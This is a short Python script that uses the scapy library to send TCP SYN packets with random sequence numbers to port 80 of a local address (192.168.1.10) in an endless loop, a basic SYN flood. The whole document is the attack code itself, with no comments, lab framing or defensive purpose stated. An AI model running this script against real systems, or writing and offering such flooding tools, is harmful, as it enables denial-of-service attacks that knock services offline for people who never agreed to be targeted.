from scapy.all import *
import random

while True:

    packet = IP(dst="192.168.1.10") / TCP(
        dport=80,
        flags="S",
        seq=random.randint(0, 999999)
    )

    send(packet, verbose=0)
